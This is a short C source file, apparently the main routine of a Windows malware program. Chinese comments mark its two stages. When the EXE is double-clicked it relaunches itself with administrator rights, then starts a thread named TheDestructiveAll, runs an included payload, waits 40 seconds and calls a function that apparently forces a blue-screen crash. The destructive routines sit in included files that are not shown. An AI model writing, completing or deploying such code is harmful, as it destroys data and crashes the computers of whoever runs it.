#include"./HelloWorld_PayLoad.C"
#include"./HelloWorld_Destructive.C"
#include<process.h>
int main(int argc, char* argv[]) {
	if (argc == 1) //初次运行，即双击EXE
	{
		Admin_Run(argv[0], "2");
		return 1;
	}
	else if (argc == 2) //再次运行,即上面那个Admin_Run
	{
		_beginthread(TheDestructiveAll,0, NULL);
		RunThePayLoad();
		Sleep(40000);
		TheWindowsBOSD();
	}
}
